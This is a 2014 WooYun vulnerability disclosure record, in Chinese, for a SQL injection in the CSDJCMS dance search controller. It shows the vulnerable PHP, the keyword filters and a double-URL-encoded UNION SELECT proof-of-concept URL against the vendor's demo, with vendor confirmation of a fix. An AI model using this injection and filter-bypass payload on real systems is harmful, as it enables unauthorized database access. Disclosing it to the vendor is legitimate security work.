{"id": 56059, "wybug_id": "wooyun-2014-059088", "wybug_title": "CSDJCMS 程式舞曲 最新版 Sql 一枚 (test demo success).", "wybug_corp": "chshcms.com", "wybug_author": "′雨。", "wybug_date": "2014-05-05 16:42", "wybug_open_date": "2014-08-03 16:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向公众公开  简要描述： 看到又更新了。。 我再继续看一看。 详细说明：   WooYun: 程氏舞曲 Sql一枚 依旧无视Gpc。 对这个洞的过滤进行绕过。改了过滤的函数。 让我继续搞。_____________________________________________________________________发现过滤了zj.php中的key但是app/controllers/dance.php中 没过滤。\npublic function so()\t{            $data='';$data_content='';            $fid = $this->security->xss_clean($this->uri->segment(3));   //方式            $key = $this->security->xss_clean($this->input->get_post('key', TRUE));   //关键字            $page  = intval($this->input->get('p', TRUE));   //页数            if($page==0) $page=1;            $key=$this->CsdjSkins->rurlencode($key);            if($fid=='zm' && empty($key)){                 $key=$this->security->xss_clean($this->uri->segment(4));             }\t    $cache_id =\"dance_so_\".$fid.\"_\".$key.\"_\".$page;\n\nfunction rurlencode($string) {               $key=rawurldecode($string);               if($this->is_utf8($key)){                    $key=iconv('UTF-8', 'GB2312', $key);               }             return $key;         }\n解码一个。\nfunction Safe($arr){\t\t//\t\t$getfilter = \"'|<[^>]*?>|^\\\\+\\/v(8|9)|\\\\b(and|or)\\\\b.+?(>|<|=|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\t\t$postfilter = \"^\\\\+\\/v(8|9)|\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|<\\\\s*img\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\t\tif (preg_match ( \"/\" . $getfilter . \"/is\", $arr ) == 1) { //GET\t\t\t$arr=''; \t\t}\t\tif (preg_match ( \"/\" . $postfilter . \"/is\", $arr ) == 1) { //POST\t\t\t$arr=''; \t\t}                \t\treturn $this->chkSql($arr);\t}\tfunction chkSql($str,$flag=false){\t\t$checkStr=\"<|>|%|%27|'|''|;|*|onfocusin|autofocus|and|exec|dbcc|alter|drop|insert|select|update|delete|count|master|truncate|char|declare|where|set|declare|mid|chr\";\t\tif (empty($str)){ return \"\"; }\t\t$arr=explode(\"|\",$checkStr);\t\t\t\tfor ($i=0;$i<count($arr);$i++){\t\t\tif (strpos(strtolower($str),$arr[$i]) >0){\t\t\t\tif ($flag==false){\t\t\t\t\tswitch ($arr[$i]){\t\t\t\t\t\tcase \"<\":$re=\"&lt;\";break;\t\t\t\t\t\tcase \">\":$re=\"&gt;\";break;\t\t\t\t\t\tcase \"'\":\t\t\t\t\t\tcase \"\\\"\":$re=\"&quot;\";break;\t\t\t\t\t\tcase \";\":$re=\"\";break;\t\t\t\t\t\tdefault:$re=\"\";break;\t\t\t\t\t}\t\t\t\t\t$str=str_replace($arr[$i],$re,$str);\t\t\t\t} else{\t\t\t\t\texit(\"ϵͳʾ,аǷַ\");\t\t\t\t}\t\t\t}\t\t}\t\treturn $str;\n这里过滤。编码绕过。   漏洞证明：  \n\nhttp://demo.chshcms.com/index.php/dance/so/key/?key=%252527) %25%36%31%25%36%45%25%36%34 1=2 union %25%37%33%25%36%35%25%36%43%25%36%35%25%36%33%25%37%34 user(),user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42 %23   修复方案：  可以尝试改改过滤函数。看你们把。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-05-05 19:03 厂商回复： 已经修复~！感谢检测~！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-06 10:05 |    \t\t走火入魔 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:2        | 多读书，多看报，少吃零食，多睡觉。)\t\t \n  雨大牛 你这是刷啊 我擦    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}